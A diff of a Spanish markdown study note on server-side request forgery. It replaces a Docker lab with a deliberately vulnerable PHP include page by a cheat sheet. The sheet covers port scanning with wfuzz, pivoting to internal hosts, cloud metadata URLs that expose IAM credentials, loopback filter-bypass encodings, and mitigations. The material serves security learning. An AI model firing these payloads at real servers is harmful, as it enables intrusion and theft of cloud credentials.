@@ -1,168 +1,115 @@
+# Server-Side Request Forgery (SSRF)
+
+SSRF es una vulnerabilidad que permite al atacante forzar al servidor web a realizar peticiones HTTP en su nombre. El servidor actúa como proxy involuntario, permitiendo acceder a recursos internos que no son accesibles desde el exterior.
+
 ---
-tags:
-  - Web
-  - Explotacion
-  - SSRF
+
+## ¿Por qué es peligroso?
+
+Los servidores web suelen tener acceso a:
+- Puertos y servicios internos no expuestos al exterior
+- Redes internas (intranets, bases de datos, otros microservicios)
+- Metadatos de instancias cloud (AWS, GCP, Azure) que pueden contener credenciales
+
 ---
 
-# Notas
+## Detección
 
-En el servidor de las páginas web pueden haber puertos que estén abiertos pero solamente en la red local, por lo que el exterior no puede ver si este puerto esta abierto o no.
+Si una aplicación acepta una URL como parámetro de entrada (para cargar una imagen, previsualizar un enlace, importar datos, etc.), probar apuntando al propio servidor:
 
-Por ello podemos ver que puertos están abiertos de la siguiente manera:
-
-Si en la web podemos ingresar una url de otra web en la solicitud, vamos a apuntar a la misma máquina con 127.0.0.1 e ir poniendo los puertos:
-
-```http
-http://172.17.0.2/utility.php?url=http://127.0.0.1
-
-http://172.17.0.2/utility.php?url=http://127.0.0.1:33
-
-http://172.17.0.2/utility.php?url=http://127.0.0.1:800
-
-http://172.17.0.2/utility.php?url=http://127.0.0.1:4646
+```
+http://target.com/utility.php?url=http://127.0.0.1
+http://target.com/utility.php?url=http://localhost
 ```
 
-En el caso de que haya uno abierto y haya dentro contenido lo vamos a poder visualizar.
+Si la respuesta cambia o devuelve contenido interno, hay SSRF.
 
-Para realizarlo más rápido:
+---
 
+## Enumeración de puertos internos
+
+Una vez confirmado el SSRF, descubrir qué servicios internos están activos en `127.0.0.1`:
+
+**Manual:**
+```
+http://target.com/utility.php?url=http://127.0.0.1:22
+http://target.com/utility.php?url=http://127.0.0.1:80
+http://target.com/utility.php?url=http://127.0.0.1:8080
+http://target.com/utility.php?url=http://127.0.0.1:3306
+```
+
+**Automatizado con wfuzz:**
 ```bash
-sudo wfuzz -c -t 200 --hl=3 -z range,1-65535 "http://172.17.0.2/utility.php?url=http://127.0.0.1:FUZZ"
+wfuzz -c -t 200 --hl=3 -z range,1-65535 \
+  "http://target.com/utility.php?url=http://127.0.0.1:FUZZ"
 ```
 
-**CON ESTO VEMOS INFORMACIÓN CONFIDENCIAL**
+Los puertos que devuelvan una respuesta diferente (distinto número de líneas o tamaño) están activos.
 
+---
 
-## Subnetting
+## Acceso a redes internas (pivoting via SSRF)
 
-En el caso de que la maquina victima este en una sub red y en esta subred haya más máquinas conectadas, podemos ingresar a través de ella como atacante utilizando la máquina de la página web (PRODUCCIÓN).
-
-Se realizaría de la siguiente manera desde el navegador:
-
-```
-http://172.17.0.2/utility.php?url=http://10.10.0.3:7878/
-```
-
-# Hack4u
-
-El **Server-Side Request Forgery** (**SSRF**) es una vulnerabilidad de seguridad en la que un atacante puede forzar a un servidor web para que realice solicitudes HTTP en su nombre.
-
-En un ataque de SSRF, el atacante utiliza una entrada del usuario, como una URL o un campo de formulario, para enviar una solicitud HTTP a un servidor web. El atacante manipula la solicitud para que se dirija a un servidor vulnerable o a una red interna a la que el servidor web tiene acceso.
-
-El ataque de SSRF puede permitir al atacante acceder a información confidencial, como contraseñas, claves de API y otros datos sensibles, y también puede llegar a permitir al atacante (en función del escenario) ejecutar comandos en el servidor web o en otros servidores en la red interna.
-
-Una de las **diferencias** clave entre el **SSRF** y el **CSRF** es que el SSRF se ejecuta en el servidor web en lugar del navegador del usuario. El atacante **no necesita engañar a un usuario legítimo** para hacer clic en un enlace malicioso, ya que puede enviar la solicitud HTTP directamente al servidor web desde una fuente externa.
-
-Para prevenir los ataques de SSRF, es importante que los desarrolladores de aplicaciones web validen y filtren adecuadamente la entrada del usuario y limiten el acceso del servidor web a los recursos de la red interna. Además, los servidores web deben ser configurados para limitar el acceso a los recursos sensibles y restringir el acceso de los usuarios no autorizados.
-
-En esta clase, estaremos utilizando **Docker** para crear **redes personalizadas** en las que podremos simular un escenario de **red interna**. En esta red interna, intentaremos a través del SSRF apuntar a un recurso existente que no es accesible externamente, lo que nos permitirá explorar y comprender mejor la explotación de esta vulnerabilidad.
-
-Para crear una nueva red en Docker, podemos utilizar el siguiente comando:
-
-➜ `docker network create --subnet=<subnet> <nombre_de_red>`
-
-Donde:
-
-- **subnet**: es la dirección IP de la subred de la red que estamos creando. Es importante tener en cuenta que esta dirección IP debe ser única y no debe entrar en conflicto con otras redes o subredes existentes en nuestro sistema.
-- **nombre_de_red**: es el nombre que le damos a la red que estamos creando.
-
-Además de los campos mencionados anteriormente, también podemos utilizar la opción ‘**–driver**‘ en el comando ‘docker network create’ para especificar el controlador de red que deseamos utilizar.
-
-Por ejemplo, si queremos crear una red de tipo “**bridge**“, podemos utilizar el siguiente comando:
-
-➜ `docker network create --subnet=<subnet> --driver=bridge <nombre_de_red>`
-
-En este caso, estamos utilizando la opción ‘**–driver=bridge**‘ para indicar que deseamos crear una red de tipo “**bridge**“. La opción –driver nos permite especificar el controlador de red que deseamos utilizar, que puede ser “**bridge**“, “**overlay**“, “**macvlan**“, “**ipvlan**” u otro controlador compatible con Docker.
-
-# Laboratorio
-
-## Lab Casero 2 maquinas
-
-```bash
-docker pull ubuntu:latest
-docker run -dit --name ssrf_first_lab ubuntu
-docker exec -it ssrf_first_lab bash
-```
-
-Dentro del contenedor:
-
-```bash
-apt update
-apt install apache2 php nano python3 -y
-service apache2 start
-cd /var/www/html
-nano utility.php
-```
-
-Contenido del archivo php
-
-```php
-<?php
-	if(isset($_GET['url'])){
-		$url = $_GET['url'];
-		echo "\n[+] Listando el contenido de la web " . $url . ":\n\n";
-		include($url);
-	}else{
-		echo "\n[+] No se ha proporcionado ningun valor para el parámetro URL\n\n";
-	}
-?>
-```
-
-```bash
-find / -name php.ini 2>/dev/null
-nano /etc/php/8.3/apache2/php.ini
-```
-
-Tiene que quedar de la siguiente manera:
-	allow_url_include= On
-
-```bash
-service apache2 restart
-```
+Si el servidor víctima está conectado a una red interna con otras máquinas, se puede usar el SSRF para alcanzarlas desde el exterior:
 
 ```
-nano login.html
+http://target.com/utility.php?url=http://10.10.0.3:8080/admin
+http://target.com/utility.php?url=http://192.168.1.50:5000/api/users
 ```
 
-Aquí buscamos código de un login por internet y lo metemos en el archivo
-Ponemos algo que identifique que es un login de producción.
+Esto convierte el servidor comprometido en un proxy hacia toda su red interna.
 
-```bash
-cp login.html /tmp/
-cd /tmp
-nano login.html
-# QUITAMOS EL IDENTIFICADOR DE PRODUCCION Y PONEMOS PREPRODUCCION
-python3 -m http.server 4646 --bind 127.0.0.1
+---
+
+## Robo de credenciales en cloud (AWS Metadata)
+
+En instancias de AWS EC2 mal configuradas, el endpoint de metadatos expone credenciales temporales de IAM:
+
+```
+http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
+http://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
 ```
 
+Equivalentes en otros proveedores:
+- GCP: `http://metadata.google.internal/computeMetadata/v1/`
+- Azure: `http://169.254.169.254/metadata/instance`
 
-## Lab Casero 3 máquinas
+---
 
-- Máquina atacante
-- Victima 1 -> 172.17.0.2 <-> 10.10.0.2 
-- Victima 2 ->10.0.0.3:8089
+## Bypass de filtros comunes
 
-La máquina atacante no puede acceder a la máquina victima 2.
-Pero las máquinas al estar en una red interna si se ven.
+Si la aplicación bloquea `127.0.0.1` o `localhost`:
 
-Máquina victima 1
-
-```bash
-docker network create --driver=bridge network1 --subnet=10.10.0.0/24
-docker run -dit --name PRO ubuntu
-docker network connect network1 PRO
+```
+http://0.0.0.0
+http://0
+http://[::1]                    # IPv6 loopback
+http://127.1
+http://127.0.1
+http://2130706433               # 127.0.0.1 en decimal
+http://0x7f000001               # 127.0.0.1 en hexadecimal
+http://localtest.me             # Resuelve a 127.0.0.1
 ```
 
+Si bloquea por palabras clave, usar redirecciones o resolución DNS propia.
 
-Máquina victima 2
+---
 
-```bash
-docker run -dit --name PRE --network=network1 ubuntu
-```
+## Diferencia SSRF vs CSRF
 
-Máquina atacante
+| Aspecto | SSRF | CSRF |
+|---|---|---|
+| Quién realiza la petición | El **servidor** web | El **navegador** de la víctima |
+| Requiere engañar un usuario | No | Sí |
+| Objetivo | Recursos internos del servidor | Acciones en nombre del usuario |
+| Detección de origen | Más difícil (viene del propio server) | Cabecera `Referer`/`Origin` |
 
-```bash
-docker run -dit --name ATTACKER ubuntu
-```
+---
+
+## Mitigaciones
+
+- Validar y filtrar URLs de entrada con lista blanca de dominios/IPs permitidos
+- Bloquear rangos de IPs privadas en las peticiones salientes del servidor (127.x, 10.x, 172.16-31.x, 192.168.x)
+- Deshabilitar `allow_url_include` y restringir `allow_url_fopen` en PHP
+- Usar un proxy de salida con filtrado para las peticiones del servidor
+- En cloud: deshabilitar el servicio de metadatos IMDSv1 y migrar a IMDSv2 (requiere token)
